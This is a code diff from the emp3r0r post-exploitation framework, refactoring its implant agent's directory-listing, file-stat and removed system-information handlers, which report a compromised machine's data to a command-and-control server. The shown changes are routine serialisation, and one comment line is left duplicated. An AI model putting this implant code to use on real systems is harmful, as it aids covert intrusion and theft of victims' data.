@@ -5,7 +5,6 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
-	"path/filepath"
 	"runtime"
 	"sort"
 	"strconv"
@@ -15,7 +14,6 @@ import (
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/ssh"
@@ -37,56 +35,15 @@ func runListDir(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	// Helper to format memory file entries
-	listMemFiles := func() {
-		files := util.ListMemFiles()
-		if len(files) == 0 {
-			c2transport.NotifyC2(cmd, "")
-			return
-		}
-		out := getMemFileCompletions(path, files)
-		c2transport.NotifyC2(cmd, "%s", strings.Join(out, "\n"))
-	}
-
-	// Check for memory path
-	if strings.HasPrefix(path, "mem:") { // match mem:, mem:/, mem://
-		listMemFiles()
-		return
-	}
-
-	var listPath string
-	switch path {
-	case ".":
-		cwd, err := os.Getwd()
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error: %v\n", err)
-			return
-		}
-		listPath = cwd
-	default:
-		absPath, err := filepath.Abs(path)
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error: %v\n", err)
-			return
-		}
-		listPath = absPath
-	}
-	entries, err := os.ReadDir(listPath)
+	out, err := util.LsPath(path)
 	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: cant read dir %s: %v\n", listPath, err)
+		c2transport.NotifyC2(cmd, "Error: %v\n", err)
 		return
 	}
-	lines := []string{listPath}
-	for _, entry := range entries {
-		if entry.IsDir() {
-			lines = append(lines, fmt.Sprintf("%s/", entry.Name()))
-		} else {
-			lines = append(lines, entry.Name())
-		}
-	}
-	c2transport.NotifyC2(cmd, "%s", strings.Join(lines, "\n"))
+	c2transport.NotifyC2Binary(cmd, out)
 }
 
+// runStat implements !stat --path <path>
 // runStat implements !stat --path <path>
 func runStat(cmd *cobra.Command, args []string) {
 	path, _ := cmd.Flags().GetString("path")
@@ -105,7 +62,12 @@ func runStat(cmd *cobra.Command, args []string) {
 		Checksum:   crypto.SHA256SumFile(path),
 		Permission: fi.Mode().String(),
 	}
-	c2transport.NotifyC2(cmd, "Name: %s\nSize: %d\nChecksum: %s\nPermission: %s", fstat.Name, fstat.Size, fstat.Checksum, fstat.Permission)
+	data, err := cbor.Marshal(fstat)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Error: %v\n", err)
+		return
+	}
+	c2transport.NotifyC2Binary(cmd, data)
 }
 
 // runBring2CC implements !bring2cc --addr <target> --kcp <on/off>
@@ -438,17 +400,6 @@ func runMemDump(cmd *cobra.Command, args []string) {
 	}
 	defer os.RemoveAll(outPath)
 	c2transport.NotifyC2(cmd, "%s\n", tarball)
-}
-
-// runSysInfo implements !sysinfo
-func runSysInfo(cmd *cobra.Command, args []string) {
-	info := agentutils.CollectFullSystemInfo()
-	data, err := cbor.Marshal(info)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
-		return
-	}
-	c2transport.NotifyC2(cmd, "%s\n", string(data))
 }
 
 // getMemFileCompletions works as ls completion
